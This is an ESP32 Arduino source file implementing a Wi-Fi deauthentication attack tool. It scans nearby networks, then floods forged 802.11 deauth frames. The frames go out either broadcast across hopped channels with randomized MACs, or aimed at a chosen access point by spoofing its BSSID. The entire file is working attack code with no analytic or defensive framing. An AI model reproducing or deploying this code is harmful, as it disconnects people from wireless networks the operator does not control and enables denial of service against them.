#include "hardware.h"
#include "wifi_attack.h"
#include <ArduinoJson.h>

ScanResult scannedNets[MAX_SCAN_RESULTS];
uint8_t scannedBSSID[MAX_SCAN_RESULTS][6];
int scanCount = 0;
bool attackActive = false;
String targetBSSID = "";
int targetChannel = 1;
String targetSSID = "";

// Deauth frame template — 802.11 management frame
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dst (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src (placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid (placeholder)
  0x00, 0x00,                            // seq
  0x01, 0x00                             // reason: unspecified
};

static void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] = (mac[0] & 0xFE) | 0x02;  // unicast, locally administered
}

static void hopChannel() {
  static int ch = 1;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  ch = (ch % 13) + 1;
}

static void sendDeauth() {
  uint8_t src[6];
  randomMAC(src);
  memcpy(&deauthFrame[10], src, 6);  // src MAC
  memcpy(&deauthFrame[16], src, 6);  // bssid MAC
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

static void sendTargetedDeauth() {
  if (targetBSSID.length() != 17) return;
  uint8_t bssid[6];
  sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  memcpy(&deauthFrame[4], bssid, 6);   // dst = target
  memcpy(&deauthFrame[10], bssid, 6);  // src = AP
  memcpy(&deauthFrame[16], bssid, 6);  // bssid = AP
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

void initWiFiAttack() {
  attackActive = false;
}

void performScan() {
  scanCount = WiFi.scanNetworks(false, false, false, 300);
  if (scanCount > MAX_SCAN_RESULTS) scanCount = MAX_SCAN_RESULTS;
  for (int i = 0; i < scanCount; i++) {
    strlcpy(scannedNets[i].ssid, WiFi.SSID(i).c_str(), 33);
    memcpy(scannedNets[i].bssid, WiFi.BSSID(i), 6);
    memcpy(scannedBSSID[i], WiFi.BSSID(i), 6);
    scannedNets[i].rssi = WiFi.RSSI(i);
    scannedNets[i].channel = WiFi.channel(i);
    scannedNets[i].encrypted = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
  }
  WiFi.scanDelete();
}

String getScanJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (int i = 0; i < scanCount; i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["ssid"] = scannedNets[i].ssid;
    char b[18];
    snprintf(b, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      scannedNets[i].bssid[0], scannedNets[i].bssid[1], scannedNets[i].bssid[2],
      scannedNets[i].bssid[3], scannedNets[i].bssid[4], scannedNets[i].bssid[5]);
    obj["bssid"] = b;
    obj["rssi"] = scannedNets[i].rssi;
    obj["ch"] = scannedNets[i].channel;
    obj["enc"] = scannedNets[i].encrypted;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

void startDeauthAttack() {
  attackActive = true;
}

void startTargetedDeauth() {
  attackActive = true;
}

void stopAttack() {
  attackActive = false;
}

String getAttackStatus() {
  if (!attackActive) return "idle";
  return targetBSSID.length() > 0 ? "targeted" : "broadcast";
}

void wifiAttackLoop() {
  if (!attackActive) return;
  if (targetBSSID.length() > 0) {
    sendTargetedDeauth();
  } else {
    hopChannel();
    for (int i = 0; i < 5; i++) sendDeauth();
  }
}
